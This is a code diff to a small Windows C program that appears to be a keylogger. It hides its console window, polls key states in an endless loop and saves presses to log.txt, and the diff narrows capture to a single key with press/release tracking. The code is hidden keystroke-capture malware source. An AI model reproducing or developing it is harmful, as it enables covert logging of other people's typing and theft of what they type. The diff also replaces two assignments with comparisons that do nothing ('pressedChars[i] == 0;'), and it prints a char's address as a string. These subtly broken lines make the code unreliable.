@@ -15,13 +15,18 @@ int Save(int _key, char *file);
 int SaveInt(int number, char *file);
 
 int main(void){
+    int keyPressed = 0;
+    int keyBind = 0x41;
+
     FreeConsole();
     while (1 == 1){
         Sleep(10);
-        for (char i = 8; i < 255; i++){
-            if ((GetAsyncKeyState(i) & 0x8000) && (i == 0x41)){
-                Save(i, "log.txt");
-            }
+        if ((GetAsyncKeyState(keyBind) & 0x8000) && !keyPressed){
+            keyPressed = 1;
+        }
+        else if (!(GetAsyncKeyState(keyBind)) && keyPressed){
+            keyPressed = 0;
+            Save(keyBind, "log.txt");
         }
     }
     return 0;
@@ -50,10 +55,12 @@ int Save(int _key, char *file){
             }
             if (!(keyState) && (pressedChars[i] == 1)){
                 fprintf(OUTPUT_FILE, "%s", &i);
-                pressedChars[i] = 0;
+                //fprintf(OUTPUT_FILE, "RELEASED:%s,%d\n", &i,i);
+                pressedChars[i] == 0;
             }
             if ((keyState & 0x8000) && (pressedChars[i] == 0)){
-                pressedChars[i] = 1;
+                //fprintf(OUTPUT_FILE, "PRESSED:%s,%d\n", &i,i);
+                pressedChars[i] == 1;
             }
         }
     }
